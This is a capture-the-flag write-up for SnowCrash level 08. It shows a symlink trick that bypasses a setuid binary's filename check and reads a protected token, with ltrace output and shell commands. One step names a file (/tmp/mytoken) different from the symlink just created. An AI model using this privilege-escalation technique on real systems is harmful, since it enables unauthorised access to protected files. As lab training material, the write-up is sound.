# LEVEL 08

## Vulnerability & exploit

No check on real user => Privilege escalation via symlink

## Eternal resources

ltrace

## Initial context

In our home directory, we see an executable with suid/guid and extended permissions (ACL), as well as a token file we don't have access to:

```
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token

level08@SnowCrash:~$ ./level08
./level08 [file to read]
```

## Solving the challenge

If we try with a file we own, the executable displays its content:

```
level08@SnowCrash:~$ echo 'HELLO' > /tmp/test && ./level08 /tmp/test
HELLO
```

But it won't work with the token file:

```
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

So what happens if we try to create a symlink to token?

```
level08@SnowCrash:~$ ln -s $(pwd)/token /tmp/token
level08@SnowCrash:~$ ls -l /tmp/token
lrwxrwxrwx 1 level08 level08 24 Oct 23 02:18 /tmp/token -> /home/user/level08/token
```

Now if we run the program with this file:

```
level08@SnowCrash:~$ ./level08 /tmp/mytoken
You may not access '/tmp/mytoken'
```

It still doesn't work... let's debug this to see what's happening:

```
level08@SnowCrash:~$ ltrace ./level08 /tmp/mytoken
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/mytoken", "token")                                 = "token"
printf("You may not access '%s'\n", "/tmp/mytoken"You may not access '/tmp/mytoken'
)             = 34
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

The name of the file is checked for presence of the word "token", so we should make sure our file is named differently:

```
level08@SnowCrash:~$ ln -s $(pwd)/token /tmp/password
level08@SnowCrash:~$ ./level08 /tmp/password
XXXXXXXXXXXXXXXXXXXXXXXXXx
```
